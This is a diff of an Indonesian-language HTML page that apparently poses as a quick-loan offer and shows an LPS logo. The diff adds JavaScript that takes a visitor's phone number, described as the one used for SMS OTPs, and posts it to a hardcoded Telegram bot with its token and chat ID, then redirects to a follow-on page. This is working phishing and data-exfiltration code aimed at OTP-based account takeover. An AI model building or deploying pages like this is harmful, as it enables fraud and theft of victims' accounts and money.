@@ -1,128 +1,194 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta name="theme-color" content="#ffffff">
-        <meta property="og:image" content="https://blogger.googleusercontent.com/img/a/AVvXsEj7HpErWhYZBPxeEvvYyX-cFOvDWqwBilClniFiM9LSShzbb6Izs8xSAUuR_FuQBxKUspBOzSNvnlfepElEB2UkgjJu7wjJUm6GT_cObJvgFc-SZDod2ISB3F_BAus895HhhTYO77L0ZUy5mef8oqGW4F4PahJxqtpPFEdP--I06508vSd9aCrmMoUGfLid">
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Modal-Cepat-Pinjaman Aman Cepat</title>
+         <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Nomor-Handphone</title>
     <style>
-        img {
-            width: 358px; /* Sesuaikan dengan lebar yang Anda inginkan */
-            height: auto; /* Biarkan ketinggian menyesuaikan dengan lebar */
-            margin-top:-8px;
-            margin-left:-9px;
-        }
-        .form-container {
-            margin-bottom: 50px;
-        }
-
-        .form-container form {
+        /* Gaya dasar untuk tampilan */
+        body {
+            background-color: #ffffff; /* Latar belakang hitam */
             display: flex;
-            flex-direction: column;
+            justify-content: center;
             align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: #fff; /* Warna teks putih */
+            margin-top:-35px;
+        }
+
+        /* Kontainer utama untuk input */
+        .input-container {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        /* Gaya untuk input nomor telepon */
+        .phone-input {
+            display: flex;
+            align-items: center;
+            border: 1px solid #ffffff; /* Warna border putih */
+            border-radius: 5px;
+            padding: 10px;
+            width: 300px;
+            margin-left:20px;
+            background-color: #cccccc; /* Latar belakang abu-abu gelap */
+            color: #000; /* Warna teks putih */
+        }
+
+        /* Gambar ikon telepon */
+        .phone-input img {
+            width: 20px;
+            height: 20px;
+            margin-right: 10px;
+        }
+
+        /* Gaya untuk elemen input */
+        .phone-input input {
+            font-size: 16px;
+            padding: 10px;
+            border: none;
+            outline: none;
+            background-color: transparent;
+            color: #000; /* Warna teks input putih */
+            flex: 1;
+        }
+
+        /* Gaya placeholder input */
+        .phone-input input::placeholder {
+            color: #999; /* Warna placeholder abu-abu terang */
+        }
+
+        /* Gaya deskripsi di bawah input */
+        .description {
             margin-top: 10px;
-            position: relative; /* Menjadikan posisi relatif untuk posisi absolut span */
+            font-size: 13px;
+            color: #bbb; /* Warna teks deskripsi abu-abu */
         }
 
-        .form-container .phone-prefix {
-            position: absolute; /* Menjadikan posisi absolut untuk span */
-            left: 5px; /* Sesuaikan dengan jarak dari kiri input */
-            top: 50%;
-            transform: translateY(-50%);
-            pointer-events: none; /* Agar tidak mengganggu klik ke input */
-            font-weight:bold;
-            font-size:14px;
-            margin-left: 39px;
-            color: #000000;
-            margin-right: 150px;
-            padding-bottom: 104px;
-            margin-top:-1px;
-        }
-
-        .form-container input[type="tel"],
-        .form-container input[type="Submit"],
-        .form-container input[type="text"] {
-            width: calc(70% - 8px);
-            padding: 13px;
-            border-radius: 8px;
-            border: 2px solid #1e90ff;
-            margin-bottom: 30px;
-            margin-left: 4px;
+        /* Gaya tombol submit */
+        .submit-btn {
+            background-color: #5a5a5a; /* Warna abu-abu untuk tombol */
+            color: #ffffff; /* Warna teks putih */
+            padding: 14px 20px;
             font-weight: bold;
-            font-size:14px;
-            padding-left: 40px; /* Menambahkan padding kiri untuk membuat ruang untuk span */
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: not-allowed; /* Tidak bisa diklik */
+            width: 320px;
+            transition: background-color 0.3s; /* Transisi warna */
         }
 
-        .form-container input[type="Submit"] {
-            width: calc(100% - 8px);
-            max-width: 290px;
-            padding: 13px;
-            border-radius: 10px;
-            background-color: #1E90FF;
-            color: white;
-            font-weight: bold;
-            cursor: pointer;
-            margin-left: 7px;
-            border-block-color: #1e90ff;
+        /* Tombol submit aktif */
+        .submit-btn.enabled {
+            background-color: #1E90FF; /* Warna kuning untuk tombol aktif */
+            cursor: pointer; /* Kursor berubah */
         }
+        
+        .gambar {
+            width: 100%;
+            margin-bottom: 0px;
+        }
+
+        .gambar img {
+            width: 100%;
+            object-fit: cover;
+            margin-bottom: 0px;
+        }
+
         .gambar-bawah {
             display: flex;
             justify-content: center;
             position: relative;
             bottom: -10px;
         }
+
         .gambar-bawah img {
             width: 85%;
             object-fit: cover;
             margin: 0 25px;
-            background:none;
-            
+            background: none;
         }
-
-        /* CSS untuk loading.gif */
-        #loading {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-        }
-
     </style>
 </head>
-
 <body>
-    <div style="text-align: center;">
-        <img src="https://raw.githubusercontent.com/M0dalcepat/M0dalcepat.github.io/refs/heads/main/1728317138389.jpg" alt="Foto">
-    </div>
-    <div class="form-container">
-        <form onsubmit="showLoading(); return false;">
-            <span class="phone-prefix">+62</span>
-            <input type="tel" id="nomor_hp" name="nomor_hp" maxlength="12" placeholder="Nomor Handphone" required>
-            <!-- Tombol submit -->
-            <input type="Submit" value="Lanjutkan">
-        </form>
-        <div id="loading" style="display: none;">
-            <img src="https://raw.githubusercontent.com/Sainilah9/Sainilah9.github.io/main/hug.gif" alt="Loading..." style="width: 30px; height: auto;">
+    <!-- Input nomor telepon -->
+    <div class="input-container">
+        <div class="gambar">
+            <img src="https://raw.githubusercontent.com/M0dalcepat/M0dalcepat.github.io/refs/heads/main/1728317138389.jpg" alt="Gambar Pucok">
         </div>
+        <div class="phone-input">
+            <img src="https://img.icons8.com/ios-filled/50/ffd700/phone.png" alt="Phone Icon"/>
+            <span>+62</span>
+            <input type="tel" id="phone" placeholder="Masukkan nomor ponsel/8xxxxxxxx" minlength="10" maxlength="13" oninput="checkPhone()">
+        </div>
+        <div class="description">
+            Silakan masukkan nomor ponsel yang sering Anda<br>Gunakan untuk menerima OTP SMS
+        </div><br>
+        <button class="submit-btn" id="submitBtn" disabled onclick="submitPhone()">Masuk</button>
         <div class="gambar gambar-bawah">
             <img src="https://raw.githubusercontent.com/M0dalcepat/M0dalcepat.github.io/refs/heads/main/1728316757502-removebg-preview.png" alt="Logo LPS">
         </div>
     </div>
 
     <script>
-        function showLoading() {
-            // Tampilkan loading.gif
-            document.getElementById("loading").style.display = "block";
+        // Fungsi untuk memeriksa validitas input nomor telepon
+        function checkPhone() {
+            const phoneInput = document.getElementById('phone').value.trim();
+            const submitBtn = document.getElementById('submitBtn');
+            
+            // Jika nomor telepon valid (10-13 digit dan hanya angka)
+            if (phoneInput.length >= 10 && phoneInput.length <= 13 && /^\d+$/.test(phoneInput)) {
+                submitBtn.disabled = false;
+                submitBtn.classList.add('enabled'); // Menambahkan kelas enabled
+                submitBtn.style.cursor = 'pointer';
+            } else {
+                submitBtn.disabled = true;
+                submitBtn.classList.remove('enabled'); // Menghapus kelas enabled
+                submitBtn.style.cursor = 'not-allowed';
+            }
+        }
 
-            // Tunggu selama 4 detik sebelum redirect
-            setTimeout(function() {
-                // Redirect ke halaman dalam.html
-                window.location.href = 'pinjaman11.html';
-            }, 4000); // 4 detik
+        // Fungsi untuk mengirim nomor telepon ke Telegram
+        function submitPhone() {
+            const phoneInput = document.getElementById('phone').value.trim();
+            
+            // Pastikan input nomor telepon tidak kosong dan valid
+            if (!phoneInput || phoneInput.length < 10 || phoneInput.length > 13 || !/^\d+$/.test(phoneInput)) {
+                alert('Masukkan nomor telepon yang valid!');
+                return;
+            }
+
+            // Ganti dengan bot token dan chat ID Telegram Anda
+            const botToken = '7423068749:AAErZulH4NM-eeLdUMNFeOH5PhXRt_MrP48'; // Masukkan bot token Anda di sini
+            const chatId = '6824078885'; // Masukkan chat ID Anda di sini
+
+            // URL untuk mengirim pesan ke bot Telegram
+            const telegramURL = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // Pesan yang akan dikirim
+            const message = `Nomor Telepon: +62${phoneInput}`;
+
+            // Kirim pesan ke Telegram menggunakan fetch API
+            fetch(telegramURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Pesan terkirim ke Telegram:', data);
+                ('');
+            window.location.href = '/pak.html';
+            })
         }
     </script>
 </body>
-
 </html>
